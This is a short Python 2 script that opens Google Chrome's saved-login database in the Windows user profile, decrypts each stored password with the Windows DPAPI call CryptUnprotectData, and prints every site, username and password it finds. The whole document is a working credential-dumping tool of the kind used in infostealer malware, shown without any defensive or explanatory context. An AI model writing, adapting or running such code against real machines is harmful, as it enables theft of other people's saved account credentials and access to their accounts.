from os import getenv
import sqlite3
import win32crypt
 
# Connect to the Database
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
  # Decrypt the Password
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		print 'Site: ' + result[0]
		print 'Username: ' + result[1]
		print 'Password: ' + password